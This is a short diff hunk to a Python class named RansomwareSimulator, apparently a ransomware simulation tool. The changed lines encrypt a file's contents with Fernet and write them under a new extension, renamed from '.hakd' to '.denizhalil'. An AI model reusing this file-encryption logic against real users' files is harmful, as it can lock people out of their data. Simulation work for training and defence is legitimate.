@@ -53,7 +53,7 @@ class RansomwareSimulator:
             original = file.read()
         encrypted = fernet.encrypt(original)
 
-        encrypted_file_path = file_path + ".hakd"
+        encrypted_file_path = file_path + ".denizhalil"
         with open(encrypted_file_path, 'wb') as encrypted_file:
             encrypted_file.write(encrypted)
 
